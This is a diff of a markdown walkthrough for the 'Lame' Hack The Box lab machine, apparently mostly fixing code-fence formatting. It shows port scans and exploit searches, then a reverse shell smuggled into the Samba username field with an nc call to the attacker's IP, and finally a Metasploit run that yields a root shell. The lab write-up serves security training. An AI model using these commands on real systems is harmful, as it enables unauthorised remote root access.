@@ -20,13 +20,13 @@ PORT     STATE SERVICE     VERSION
 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-...
+```
 
 By scanning all the ports instead of top 1000 we found also port 3632.
 
 ## Vulnerability analysis
 
-...
+```
 $ searchsploit --nmap nmap_full_lame.xml                                                                                                            2 ⨯
 [i] SearchSploit's XML mode (without verbose enabled).   To enable: searchsploit -v --xml...
 [i] Reading: 'nmap_full_lame.xml'
@@ -164,7 +164,7 @@ Sambar Server 6.1 Beta 2 - 'showperf.asp?title' Cross-Site Scripting            
 SWAT Samba Web Administration Tool - Cross-Site Request Forgery                                                         | cgi/webapps/17577.txt
 ------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcodes: No Results
-...
+```
 
 ## System hacking
 
@@ -181,7 +181,7 @@ The machine does not seem to have this vulnerabilty though.
 
 Checking https://www.cvedetails.com/vulnerability-list/vendor_id-102/Samba.html shows extensive amount of vulnerabilities. 
 
-...
+```
 $ nmap -Pn -A -T4 -p 139,445 10.10.10.3
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-04 13:43 EDT
@@ -207,11 +207,11 @@ Host script results:
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 |_smb2-time: Protocol negotiation failed (SMB2)
-...
+```
 
 It is possible to login as a guest.
 
-...
+```
  smbmap -R -H 10.10.10.3                                                                                                                         127 ⨯
 [+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
         Disk                                                  	Permissions	Comment
@@ -269,20 +269,20 @@ smb: \> dir
   vgauthsvclog.txt.0                  R     1600  Mon Oct  4 12:53:24 2021
 
 		7282168 blocks of size 1024. 5386472 blocks available
-...
+```
 
 Now that we have smb shell let's try to create a reverse shell.
 
 First netcat to listen
-...
+```
 $ nc -vlp 1337                                                                                                                                      1 ⨯
 listening on [any] 1337 ...
-...
+```
 
 And then reverse shell
-...
+```
 smb: \> logon “/='nc 10.10.14.15 1337 -e /bin/bash'
-...
+```
 
 While there are walkthroughs that open a shell (for example https://medium.com/@siddharth.singhal1995/htb-walkthrough-lame-1-caa8d4b4da39), at this time it did not work.
 
@@ -292,7 +292,7 @@ macha97 has kindly created an exploit that we can use: https://github.com/macha9
 
 After running the msfvenom with the correct LHOST:
 
-...
+```
 $ python3 exploit-smb-3.0.20.py
 
 $ nc -nvlp 1338
@@ -324,9 +324,11 @@ drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
 -rwx------  1 root root  401 May 20  2012 reset_logs.sh
 -rw-------  1 root root   33 Oct  4 12:53 root.txt
 -rw-r--r--  1 root root  118 Oct  4 12:53 vnc.log
+´´´
+
 After running the msfvenom with the correct LHOST:
 
-...
+```
 $ python3 exploit-smb-3.0.20.py
 
 $ nc -nvlp 1338
@@ -358,10 +360,10 @@ drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
 -rwx------  1 root root  401 May 20  2012 reset_logs.sh
 -rw-------  1 root root   33 Oct  4 12:53 root.txt
 -rw-r--r--  1 root root  118 Oct  4 12:53 vnc.log
-...
+```
 
 The same can be achieved with metasploit:
-...
+```
 $ msfconsole -q
 msf6 > user exploit/multi/samba/usermap_script
 [-] Unknown command: user
@@ -403,4 +405,5 @@ msf6 exploit(multi/samba/usermap_script) > run
 
 whoami
 root
-...
+```
+
